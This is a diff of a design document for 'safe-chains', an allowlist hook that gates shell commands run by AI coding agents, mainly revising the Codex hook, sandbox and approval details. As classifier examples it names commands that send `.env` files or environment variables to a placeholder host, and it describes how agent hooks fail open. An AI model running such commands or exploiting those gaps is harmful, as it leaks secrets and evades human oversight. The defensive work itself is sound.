@@ -21,7 +21,7 @@ independently exercised.
 | Harness  | Runtime hook | Status | Evidence / note |
 |----------|:------------:|--------|-----------------|
 | **Claude** | ✅ | ✅ **Docs-checked** v2.1.302 (2026-10-21); live drive 2026-07 | `claude --version` is 2.1.302. `allow` skips the prompt. Omitting the decision is the normal flow. Explicit `defer` ends the turn. See §Claude. |
-| **Codex** | ✅ | ✅ **Probe-verified** `PreToolUse` (v0.144.3, 2026-07-13) · ◻️ **Source-verified** `PermissionRequest` (v0.160.1, 2026-10-05) | `PreToolUse`: `deny` honored; `allow`/`ask` unsupported (still so in v0.160.1 source). `PermissionRequest` (v0.122.0+): `decision.behavior:"allow"` answers Codex's approval prompt; not yet driven end to end. Config nests under top-level `hooks`. See §Codex. |
+| **Codex** | ✅ | 📄 **Docs-checked** CLI 0.163.0 (2026-10-21); hooks not re-driven | `codex --version` is `codex-cli 0.163.0` (latest stable, 2026-10-15). `PreToolUse` `deny` is honored. A bare `allow` and `ask` fail open; `allow` with `updatedInput` rewrites. `PermissionRequest` `decision.behavior:"allow"` answers the approval. A sandboxed `/etc/hosts` read completed under `read-only` and `workspace-write`. See §Codex. |
 | **Antigravity (`agy`)** | ✅ | 📄 **Docs-checked** v1.4.3 (2026-10-21); last live drive v1.1.2 | CLI `agy --version` is 1.4.3. Not re-driven. `allow` delegates to the next hook or default policy. `auto_approve` is the documented grant. `deny`, `ask`, `force_ask`, and `deny_unless_prior_grant` are documented. See §Gemini. |
 | **Gemini** | (exit codes) | 📄 **Docs-checked** v0.64.0 (2026-10-21); binary not installed | Consumer accounts stopped 2026-06-18. Stable v0.64.0 (2026-10-13) still documents `BeforeTool` with `allow` / `deny` only. Target kept for that CLI. |
 | **Qwen** | ✅ | 📄 **Docs-checked** v0.25.3 (2026-10-21); binary not installed | English hooks doc: shell tool id is `run_shell_command`. `allow` does not skip the approval prompt. `ask` and `additionalContext` are documented. Not driven live. See §Qwen. |
@@ -34,18 +34,19 @@ independently exercised.
 **Remaining live-verification work:** Qwen is docs-checked at v0.25.3 and was not driven live (see §Qwen). Grok is docs-checked at v1.0.62 (the v0.2.106 drive is the last live result — see §Grok); Copilot's
 current contract is docs-checked at v1.0.101 (the v1.0.71 drive is the last live result — see §Copilot);
 Cursor's schema is docs-checked at CLI v2026.10.08 (the v2026.07.16 drive is the last live result — see §Cursor);
-Droid is docs-checked at CLI v0.245.0 and was not driven live (see §Droid); Gemini CLI v0.64.0 and `agy` 1.4.3 are docs-checked (the v1.1.2 drive is the last live result — see §Gemini); Claude is docs-checked at v2.1.302 (see §Claude); Codex done; opencode v2.0.26 documents `permission.evaluate` and safe-chains still skips install (see §opencode).
+Droid is docs-checked at CLI v0.245.0 and was not driven live (see §Droid); Gemini CLI v0.64.0 and `agy` 1.4.3 are docs-checked (the v1.1.2 drive is the last live result — see §Gemini); Claude is docs-checked at v2.1.302 (see §Claude); Codex is docs-checked at CLI 0.163.0 and was not re-driven (see §Codex); opencode v2.0.26 documents `permission.evaluate` and safe-chains still skips install (see §opencode).
 
 ## The model we rely on
 
 safe-chains is **allowlist-only**; what it EMITS for a given command depends on the
 **harness's capabilities** (`docs/design/harness-capability-model.md`):
 
-- **Safe command** → `allow` where the harness supports granting (Claude), else *silent* (the
-  command just runs — e.g. Codex, which has no grant).
+- **Safe command** → `allow` where the harness grants (Claude; Codex `PermissionRequest`,
+  which answers the approval Codex was about to show). Codex `PreToolUse` has no grant, so
+  safe-chains stays silent and Codex's own flow runs the command.
 - **Gated command** → *silent* where a human still reviews it (Claude's own prompt is the check),
-  else **`deny`** where the harness offers no interactive approval and no `ask` (Codex: staying
-  silent would just run it, and its sandbox permits broad reads). Exceptions on a deny-harness are
+  else **`deny`** where silence would run it and the harness has no `ask` (Codex `PreToolUse`:
+  `workspace-write` runs an in-sandbox read with no approval). Exceptions on a deny-harness are
   config-level (a custom command / grant), not per-invocation.
 
 So we *do* actively deny on some harnesses (Codex) — the flip from the old "never deny" is
@@ -95,8 +96,8 @@ target looks like.
 | Target  | Tool / matcher          | Envelope shape                         | Decision field      | Values honored        | Timeout unit |
 |---------|-------------------------|----------------------------------------|---------------------|-----------------------|--------------|
 | Claude  | `Bash` (exact match)    | `{hookSpecificOutput: {...}}`          | `permissionDecision`| `allow` / `deny` / `ask` / `defer`. Omit is the normal flow, not `defer` | seconds (command default 600) |
-| Codex `PreToolUse` | `Bash`; config nests under top-level `hooks` | `{hookSpecificOutput: {...}}` | `permissionDecision`| **deny** (gated); *silent* (safe). `allow`/`ask` parsed-but-UNSUPPORTED (v0.144.3 through v0.160.1) | seconds |
-| Codex `PermissionRequest` | `Bash`; same file, same command; routed on `hook_event_name` | `{hookSpecificOutput: {...}}` | `decision.behavior` | **allow** (safe); *silent* (everything else → Codex's own prompt) | seconds |
+| Codex `PreToolUse` | `Bash` (unified exec is reported as `Bash`); config nests under top-level `hooks` | `{hookSpecificOutput: {...}}` | `permissionDecision`| **deny** (gated); *silent* (safe). Bare `allow` and `ask` fail open (CLI 0.163.0). `allow` + `updatedInput` rewrites | seconds (default 600) |
+| Codex `PermissionRequest` | `Bash`; same file, same command; routed on `hook_event_name` | `{hookSpecificOutput: {...}}` | `decision.behavior` | **allow** (safe); *silent* otherwise (Codex's own prompt). `deny` is honored; safe-chains does not emit it | seconds (default 600) |
 | Qwen    | code matcher `^Bash$` (regex only); exact `Bash` is the alias; tool id `run_shell_command` | `{hookSpecificOutput: {...}}` | `permissionDecision` | `allow` (does not skip the prompt), **deny**, **ask** | seconds; a command value ≥ 1000 is still read as ms |
 | Droid   | `Execute` (regex or exact; optional `commandRegex` on the shell string) | `{hookSpecificOutput: {...}}` | `permissionDecision` | **allow** (can bypass the prompt), **deny**, **ask** | seconds (default 60) |
 | Gemini  | `^run_shell_command$` (`BeforeTool`) | `{decision: ...}` | `decision` | **allow** / **deny** (alias `block`). No `ask` | ms (examples use `5000`) |
@@ -164,85 +165,149 @@ Notes:
 
 Verified: grok 1.0.62 2026-10-21
 
-### Codex — researched 2026-07-13, v0.144.3 (probe-verified)
+### Codex — docs-checked CLI 0.163.0, 2026-10-21
 
-- **Official docs:** https://learn.chatgpt.com/docs/hooks · https://developers.openai.com/codex/concepts/sandboxing · https://developers.openai.com/codex/agent-approvals-security
-- **Config schema:** `~/.codex/hooks.json` must nest events under a top-level `hooks` object:
-  `{"hooks":{"PreToolUse":[{"matcher":"Bash","hooks":[{"type":"command","command":"safe-chains hook codex"}]}]}}`.
-  A flat top-level `PreToolUse` (Claude's shape) is **rejected** — `unknown field PreToolUse` — and the
-  hook never loads. Codex prompts to *trust* a new/changed hook on first run.
-- **Input:** `tool_input.command` (Bash), `cwd`, plus `tool_name`/`model`/`permission_mode`/… (ignored).
-- **Decision values:** `deny` and (per docs) `allow`; but **`allow` errored on v0.144.3**
-  (`unsupported permissionDecision:allow`) — version drift. `ask` / legacy `approve` / `continue:false`
-  / `stopReason` / `suppressOutput` are **parsed but not supported**. An unsupported decision → Codex
-  "marks the hook failed, reports the error, and **continues the tool call**" (fail-open — emit only a
-  supported shape).
-- **Capabilities:** grant ❌ (allow unsupported here) · deny ✅ · escalate/`ask` ❌ · human-review-on-silence ❌
-  (only sandbox-*escape* prompts) · sandbox ✅ `workspace-write` (blocks out-of-workspace writes + network,
-  **permits broad reads**). → safe-chains emits **silent** for safe, **`deny`** for gated (`src/targets/codex.rs`).
-- **Verified end-to-end:** safe `cat README.md` runs clean; gated `cat /etc/hosts` (sandbox would allow
-  the read) is **blocked by the hook** with the config-exception reason.
+`codex --version` reports `codex-cli 0.163.0`, the latest stable release (2026-10-15).
+A later alpha, 0.164.0-alpha.8, was not part of this check. Sources:
+[Hooks](https://learn.chatgpt.com/docs/hooks),
+[Sandbox](https://learn.chatgpt.com/docs/sandboxing),
+[Agent approvals & security](https://learn.chatgpt.com/docs/agent-approvals-security),
+and the hook schema plus the approval path at tag `rust-v0.163.0`. The 2026-07
+probe and the 2026-10-05 source pass were not repeated as an agent session. No
+hook was installed and no credentials were used.
 
-#### Codex `PermissionRequest` — researched 2026-10-05, v0.160.1 (docs + source, not yet driven live)
+- **Config.** `hooks.json`, or an inline `[hooks]` table, in `~/.codex/` and in a
+  trusted project `.codex/`. Plugins can bundle the same file. Layers merge; a
+  higher layer does not replace a lower one. The file allows an optional
+  `description` and `hooks`. A flat top-level `PreToolUse` is rejected
+  (`unknown field PreToolUse`) and the hook never loads. `--setup` writes both
+  events under `hooks`, matcher `Bash`, command `safe-chains hook codex`.
+  `matcher` is a regex. Empty, `*`, or omitted matches every tool for events
+  that honor it. `Bash` matches the shell tool and unified exec
+  (`exec_command`), which the payload reports as `Bash`. `apply_patch` also
+  matches `Edit` and `Write`, and `tool_name` stays `apply_patch`. `timeout` is
+  seconds. The default is 600 (`SessionEnd` and `Interrupt` default to 1 and
+  cap at 3). `command` and `mcp_tool` handlers run. `prompt` and `agent`
+  handlers are parsed and skipped. `features.hooks` is stable and on by
+  default (`codex features list` on 0.163.0).
+- **Trust.** Codex stores a hash of each non-managed hook and skips a new or
+  changed hook until `/hooks` trusts it. Startup prints a warning when a hook
+  needs review. Managed hooks are trusted by policy.
+  `--dangerously-bypass-hook-trust` runs enabled hooks for that invocation
+  without persisted trust. `--setup` cannot trust a hook. Project `.codex/`
+  hooks load only when that layer is trusted.
+- **Input.** `session_id`, `turn_id`, `cwd`, `hook_event_name`, `model`,
+  `permission_mode` (`default`, `acceptEdits`, `plan`, `dontAsk`,
+  `bypassPermissions`), and `transcript_path` (nullable). `PreToolUse` also
+  sends `tool_name`, `tool_use_id`, and `tool_input`. `PermissionRequest` does
+  not require `tool_use_id`. A subagent may add `agent_id` and `agent_type`.
+  `cwd` is the session working directory. `exec_command`'s `workdir` is absent
+  from `tool_input`; its `PreToolUse` payload is `{"command":"<cmd>"}`. A
+  `Bash` `PermissionRequest` carries `command` and, when Codex has one,
+  `description`. A network approval uses `network-access <host>`. The same
+  events also carry `apply_patch` (its `tool_input.command` is the patch), MCP
+  tools, `write_stdin`, and `request_permissions`, so `tool_name` must be
+  `Bash` or safe-chains abstains. `write_stdin` does not run `PreToolUse`
+  again. Hosted tools such as `WebSearch` are not hooked.
+- **`PreToolUse` decisions.** `permissionDecision: "deny"` with
+  `permissionDecisionReason` blocks. So does the legacy
+  `{"decision":"block","reason":...}` shape, and exit 2 with the reason on
+  stderr. `permissionDecision: "allow"` together with `updatedInput.command`
+  rewrites the command. The last completed rewrite wins, and a block discards
+  rewrites. A bare `allow`, with no `updatedInput`, is unsupported: the 0.163.0
+  source marks the hook failed, reports
+  `unsupported permissionDecision:allow`, and continues the call. On a
+  synchronous command hook that failure also drops an accompanying
+  `additionalContext`. `ask`, legacy `decision: "approve"`, `continue: false`,
+  `stopReason`, and `suppressOutput` are parsed and fail open the same way.
+  `additionalContext` with no decision is recorded and does not block. Plain
+  stdout is ignored. A callback error, a timeout, or malformed JSON fails the
+  hook and does not block. `updatedInput` without `allow` is an error.
+- **`PermissionRequest` decisions.** The event was added in v0.122.0. It runs
+  in the approval path, before the user or the guardian reviewer is asked, and
+  only when Codex would ask: a sandbox escalation (`require_escalated`), a
+  managed-network approval, or any other command that needs approval. It does
+  not run for a command the sandbox already allows.
+  `decision.behavior: "allow"` is `ReviewDecision::Approved` and skips the
+  prompt. `behavior: "deny"` with `message` refuses. Empty stdout and exit 0
+  decline to decide. Exit 2 with a reason on stderr denies; exit 2 with empty
+  stderr fails the hook and takes no decision. Any other exit, or JSON Codex
+  cannot parse, marks the hook failed and takes no decision. `updatedInput`,
+  `updatedPermissions`, and `interrupt: true` fail closed. Several hooks: any
+  `deny` wins, otherwise an `allow`. This event has no `additionalContext`
+  field. `approval_policy = "untrusted"` is retired and can stop the client
+  from starting. The stricter always-ask behavior is a user-level project
+  entry `trust_level = "untrusted"` (`AskForApproval::UnlessTrusted`). An
+  explicit `on-request` overrides that derived policy.
+- **Approvals and the sandbox.** The sandbox is the boundary.
+  `approval_policy` decides when Codex asks. The usual local preset is
+  `workspace-write` with `on-request`: reads, in-workspace edits, and routine
+  commands inside that boundary run with no approval. Network stays off unless
+  `sandbox_workspace_write.network_access` is enabled. Permission profiles
+  (`:read-only`, `:workspace`, `:danger-full-access`) do not compose with
+  `sandbox_mode`: if that key is set in any loaded config, passed as
+  `--sandbox`, or set by the selected profile, Codex uses the older sandbox
+  settings. `read-only` can inspect files and asks before running a command.
+  `approvals_reviewer = "auto_review"`
+  reviews only actions that already need approval and does not widen the
+  sandbox. A `PermissionRequest` allow of a `require_escalated` command runs
+  with no filesystem sandbox, except when the filesystem policy has denied-read
+  paths: those stay denied (`EscalatedSandboxWithRestrictions`, changelog
+  0.161.0, #49353; `codex-rs/core/src/tools/sandboxing.rs` at `rust-v0.163.0`).
+  On CLI 0.163.0, `codex sandbox -- <command>` runs that command under the
+  platform sandbox. The docs' `codex sandbox macos` spelling is not a
+  subcommand in this CLI: the first argument is the command. A read of
+  `/etc/hosts` through that runner exited 0 under `sandbox_mode="read-only"`
+  and under `sandbox_mode="workspace-write"`. That is the sandbox process, not
+  an agent turn.
+- **What safe-chains emits.** On `PreToolUse`, silence for a safe command and
+  `permissionDecision: "deny"` for a gated one. It emits no `allow`, `ask`,
+  `updatedInput`, or `additionalContext`. Silence is the safe-command answer:
+  a bare `allow` fails open and Codex runs the command. safe-chains denies on
+  `PreToolUse` because `workspace-write` runs an in-sandbox read with no prompt and `PreToolUse`
+  has no `ask`. On `PermissionRequest`, `decision.behavior: "allow"` for a
+  safe read and silence otherwise (`Defer`). It never emits `deny` on this
+  event: a gated command was already denied at `PreToolUse`, and leaving the
+  prompt is what this event is for. Both events go to `safe-chains hook codex`.
+  `hook_event_name`, which Codex sets, selects the format.
+- **The cwd is not the command's.** `exec_command`'s `workdir` is absent from
+  both payloads, and an approval can leave the filesystem sandbox, so
+  `PermissionRequest` sets `cwd_is_the_commands() == false`. Classification
+  uses `UNKNOWN_WORKDIR` with the reported cwd as the workspace root. A
+  relative write (`echo x >> .zshrc`) lands outside every workspace and stays
+  on Codex's prompt. A path-free or absolute command classifies as usual.
+  Writes are judged at the folder level (`[unknown_folder] writes`, or
+  `hook codex --unknown-folder=LEVEL`; default `developer`). At `reads`, only
+  `SafeRead` and below are granted, and every write goes to Codex's prompt. A
+  `cwd` that folds to `/` (`/`, `/.`, `/Users/..`) or is not absolute abstains
+  (`bounds_a_workspace`). `PreToolUse` keeps the reported cwd and its full
+  band: there the sandbox confines writes. The `workdir` gap remains (TODO.md,
+  "Codex runs a command in a `workdir`").
+- **Network and shell syntax.** Same classifier as Claude Code (2026-10-08).
+  An approval grants network the sandbox withheld. The classifier refuses a
+  command that could carry a file or the environment out
+  (`curl https://x/$(cat .env)`, `printenv | xargs -I{} curl https://x/{}`)
+  and approves a network read (`curl https://example.com`, `git ls-remote`).
+  A description that starts with `network-access ` is judged by its command.
+  At `reads`, that is what Claude's hook would give with the folder equally
+  unknown (`tests/codex_permission_request.rs`).
+- **Older Codex.** Before v0.122.0 the events table did not reject unknown
+  names, so an extra `PermissionRequest` key was ignored and `PreToolUse` kept
+  working (v0.121.0 `hooks/src/engine/config.rs`). CLI 0.163.0 knows the
+  event. The top-level file still rejects unknown keys. Unknown names inside
+  `hooks` are ignored.
+- **Shell children.** CLI 0.163.0 uses the standard shell executor. The patched
+  zsh `execve` path is gone, and `[features].shell_zsh_fork` is ignored. A
+  child of a shell command is not its own `PermissionRequest`. With both
+  entries installed, a gated command the model runs is denied at `PreToolUse`,
+  in tool dispatch, and never reaches this event. `PermissionRequest` still
+  covers a user who keeps that entry and drops `PreToolUse`.
+- **Not driven this pass.** No trusted hook and no agent turn. Live checks were
+  `codex --version`, `codex features list`, and the sandboxed `/etc/hosts`
+  reads above. The last agent drive is the 2026-07 probe on v0.144.3: a safe
+  `cat README.md` ran, and a gated `cat /etc/hosts` was blocked by the hook.
 
-- **What it is:** a second hook event, added in v0.122.0 (openai/codex#17563). It runs in Codex's
-  approval path, before the user (or the guardian reviewer) is asked, and **only when Codex would ask**:
-  a sandbox escalation (`sandbox_permissions: "require_escalated"`), a managed-network approval, or
-  any command not trusted under the `untrusted` approval policy. It does not run for commands that
-  need no approval. Source: `codex-rs/hooks/src/events/permission_request.rs`,
-  `codex-rs/core/src/tools/approvals.rs` (`permission_request_payload`).
-- **Input:** `hook_event_name: "PermissionRequest"`, `tool_name`, `tool_input`, `cwd`, `session_id`,
-  `turn_id`, `model`, `permission_mode`, `transcript_path`. For `Bash`, `tool_input` is
-  `{"command": "<raw string>", "description": "<the model's justification>"}`; a zsh-fork `execve`
-  arrives as the shlex-joined argv, and a network approval as the command with description
-  `network-access <host>`. The same event also carries `apply_patch` (whose `tool_input.command`
-  is the PATCH), MCP tools, `write_stdin` and `request_permissions` — so `tool_name` must be
-  checked, and is required, not optional.
-- **Output:** `{"hookSpecificOutput":{"hookEventName":"PermissionRequest","decision":{"behavior":"allow"}}}`
-  answers the prompt (`ReviewDecision::Approved`, this once). `behavior:"deny"` (+ `message`) refuses.
-  Empty stdout, exit 0 → no decision, Codex's normal approval flow. Exit 2 + stderr = deny. Any
-  other exit, or JSON it cannot parse → the hook run is marked failed and no decision is taken.
-  `updatedInput`, `updatedPermissions` and `interrupt:true` are reserved: Codex fails the hook if
-  they appear. Several hooks: any `deny` wins, else any `allow`.
-- **safe-chains' answer:** `allow` for a safe read (below), nothing otherwise (gated policy
-  `Defer`). It never emits `deny` here: a gated command already got the `PreToolUse` veto, and
-  leaving the prompt in place is what the event is for.
-- **The cwd is not the command's.** `cwd` is the turn's directory; `exec_command` takes a `workdir`
-  (`core/src/tools/handlers/unified_exec/exec_command.rs`) that neither event's payload carries. An
-  approval here runs outside the sandbox, so the format declares `cwd_is_the_commands() == false`
-  and `targets::evaluation_dirs` classifies the command at `UNKNOWN_WORKDIR` with the reported cwd
-  as the workspace root: a relative write (`echo x >> .zshrc`) lands outside every workspace and is
-  left to Codex's prompt, a path-free or absolute command classifies as usual. Writes are then
-  judged at the folder level (`[unknown_folder] writes` in the user config, or `hook codex
-  --unknown-folder=LEVEL`; default `developer`): `pathctx::folder` places each relative path by its
-  anchor value and refuses a write that names no path unless the command declares `writes_cwd`
-  (docs/design/unknown-folder-writes.md). At `reads`, `targets::respond` grants only `SafeRead` and
-  below, and every write goes to Codex's prompt. A `cwd` that folds to `/` (`/`, `/.`,
-  `/Users/..`) or is not absolute abstains. `PreToolUse` keeps the reported cwd and its full band:
-  there the sandbox confines writes. Remaining gaps: TODO.md "Codex runs a command in a `workdir`".
-- **Network and shell syntax: as for Claude Code** (owner's decision, 2026-10-08). An approval
-  grants the network the sandbox withheld, and the classifier judges network commands and shell
-  syntax here exactly as it does on Claude's hook: it refuses what could carry a file or the
-  environment out (`curl https://x/$(cat .env)`, `printenv | xargs -I{} curl https://x/{}`) and
-  approves a network read (`curl https://example.com`, `git ls-remote`). A host-level network
-  approval (`description` starting `network-access `) is judged by its command. The only rule of
-  this event's own is the folder level above; at `reads` that is what Claude's hook would give with
-  the folder equally unknown (`tests/codex_permission_request.rs` checks the two agree).
-- **Routing:** both events go to `safe-chains hook codex`; `CodexTarget::hook_format_for` reads
-  `hook_event_name` (set by Codex, not reachable by the agent) and answers a `PermissionRequest`
-  in this shape, everything else in the `PreToolUse` shape as before.
-- **Older Codex:** before v0.122.0 the events struct had no `deny_unknown_fields`, so the extra
-  `PermissionRequest` key is ignored and `PreToolUse` keeps working (checked against the v0.121.0
-  `hooks/src/engine/config.rs`).
-- **Trust:** Codex records trust against each hook's hash and **silently skips** a new or changed
-  hook until it is trusted in `/hooks`. `--setup` cannot trust it for the user.
-- **With both entries installed, a gated command the model runs never reaches this event**:
-  `PreToolUse` runs in tool dispatch (`core/src/tools/registry.rs`), before the approval path, and
-  denies it there. The silent fallback is for what has no `PreToolUse` of its own: the programs a
-  command starts under the zsh-fork `execve` path, which ask one by one, and a user who keeps
-  `PermissionRequest` but drops `PreToolUse`.
-- **To verify live:** with both entries trusted, under `-a untrusted`, `git status` should run with
-  no prompt, and `cat /etc/hosts` should still be denied by `PreToolUse`.
+Verified: codex 0.163.0 2026-10-21
 
 ### Gemini → Antigravity — docs-checked 2026-10-21
 
@@ -522,7 +587,7 @@ flow is untouched.
 | Grok    | Yes, on settings-file `PreToolUse` (`~/.grok/docs/user-guide/10-hooks.md`; clipped at 10,000 characters; dropped on hook deny, prompt reject, and `defer`) | default abstain |
 | Qwen    | Yes on `PreToolUse` ([hooks.md](https://github.com/QwenLM/qwen-code/blob/v0.25.3/docs/users/features/hooks.md) at v0.25.3). Output options also mark `permissionDecision` and `permissionDecisionReason` required | emit on the mixed-chain case, with no decision |
 | Droid   | Not listed on `PreToolUse` ([hooks reference](https://docs.factory.com/reference/hooks-reference.md) lists it on `PostToolUse`, `UserPromptSubmit`, `SessionStart`) | code still emits it on `PreToolUse` |
-| Codex   | Unverified                  | default abstain (emit nothing) |
+| Codex   | Yes on `PreToolUse` ([Hooks](https://learn.chatgpt.com/docs/hooks), CLI 0.163.0). `PermissionRequest` has no `additionalContext` field | default abstain (emit nothing) |
 | Cursor  | No `additionalContext` on `beforeShellExecution` ([Hooks](https://cursor.com/docs/hooks): `permission`, `user_message`, `agent_message`) | default abstain |
 | Gemini  | Not a `BeforeTool` field ([hooks reference](https://geminicli.com/docs/hooks/reference/) puts `additionalContext` on `BeforeAgent`) | n/a |
 | agy     | No context field ([Hooks](https://antigravity.google/docs/hooks): `decision`, `reason`, `overwrite`, `permissionOverrides`) | n/a |
@@ -559,7 +624,7 @@ e2e note):
 | Grok     | ✅ | ✅ | `workspaceRoot` in the payload (also `GROK_WORKSPACE_ROOT`) |
 | Droid    | ✅ | ✅ | `FACTORY_PROJECT_DIR` env var |
 | Qwen     | ✅ | ✅ | `QWEN_PROJECT_DIR` env var |
-| Codex    | ✅ | ❌ | cwd only — no distinct root (`cwd` is the "project dir equivalent") |
+| Codex    | ✅ | ❌ | session `cwd` only — no distinct project root; `exec_command`'s workdir is omitted |
 | Copilot  | ✅ | ❌ | cwd only — no documented root field/var |
 | opencode | ❌ in safe-chains | ❌ in safe-chains | v2 `permission.evaluate` receives the shell command as a resource; safe-chains installs no plugin |
 
@@ -584,7 +649,7 @@ Kept as a menu for *future* safe-chains features, with the plausible use:
 | `hook_event_name` | most | confirm we're on the pre-exec event |
 | `tool_use_id` / `turn_id` / `generation_id` | Claude, Codex, Cursor | correlate a decision to a specific call |
 | `model` | Codex, Cursor | per-model policy |
-| `permission_mode` | Claude, Droid | respect the user's current mode |
+| `permission_mode` | Claude, Droid, Codex (`default`, `acceptEdits`, `plan`, `dontAsk`, `bypassPermissions`) | respect the user's current mode |
 | `timestamp` | Gemini, Qwen, Copilot | logging |
 | `cursor_version` / cli version | Cursor | version-gate quirks |
 | `user_email` | Cursor | attribution |
